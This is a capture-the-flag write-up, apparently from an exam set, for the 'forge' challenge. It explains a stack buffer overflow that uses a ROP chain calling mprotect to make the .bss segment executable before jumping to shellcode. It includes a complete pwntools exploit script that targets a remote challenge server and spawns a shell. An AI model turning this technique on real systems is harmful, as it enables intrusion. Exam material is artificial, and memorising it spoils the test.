### forge - Stack Buffer Overflow


> x Exam (33)


The advanced execution mechanics of the `01_forge` challenge require a highly structured script capable of shifting seamlessly between local diagnostic environments and remote deployment targets. The underlying application performs two separate input operations, where the initial operation populates a global buffer inside the writable `.bss` segment with raw shellcode bytes, and the subsequent operation triggers a stack buffer overflow by reading unconstrained data into a small local buffer. This architecture facilitates a two-stage exploitation strategy designed to bypass the non-executable memory mitigation, which normally blocks the direct execution of code residing within data segments.

> The extraction of functional shellcode requires utilizing systemic frameworks like pwntools to automatically generate the payload bytes, which must then be padded to ensure the input fills the expected structure of the global buffer.

The secondary stage utilizes the stack vulnerability to construct a precise Return-Oriented Programming chain that invokes the `mprotect` system call, passing the page-aligned address of the `.bss` segment, a standard length of `0x1000` bytes, and the permission mask of 7 to grant read, write, and execute access. Achieving accurate page alignment involves masking the lower twelve bits of the target symbol address, ensuring compliance with the architectural requirements of the operating system. To guarantee that the exploit functions identically across local processes and remote Docker environments, the script isolates the connection logic into a modular function block that dynamically switches the target based on runtime arguments.



```Python
#!/usr/bin/env python3  
  
from pwn import *  
  
elf = ELF('./forge', checksec=False)  
context.binary = elf  
context.arch = 'amd64'  
  
HOST = "offsec.m0lecon.it"  
PORT = 13558  
OFFSET_TO_RIP = 72  
  
shellcode = asm(shellcraft.sh())  
shellcode_addr = elf.sym.shellcode  
page = shellcode_addr & ~0xfff  
  
def conn():  
    if not args.LOCAL:  
        return remote(HOST, PORT)  
    return process(elf.path)  
  
p = conn()  
  
p.recvuntil(b'shellcode')  
p.send(shellcode.ljust(0x400, b'\x90'))  
  
payload = flat(  
    b'A' * OFFSET_TO_RIP,  
    p64(elf.sym.ret_gadget),  
    p64(elf.sym.pop_rdi_ret),  
    p64(page),  
    p64(elf.sym.pop_rsi_ret),  
    p64(0x1000),  
    p64(elf.sym.pop_rdx_ret),  
    p64(7),  
    p64(elf.plt.mprotect),  
    p64(shellcode_addr)  
)  
  
p.recvuntil(b'Input')  
p.send(payload)  
p.interactive()
```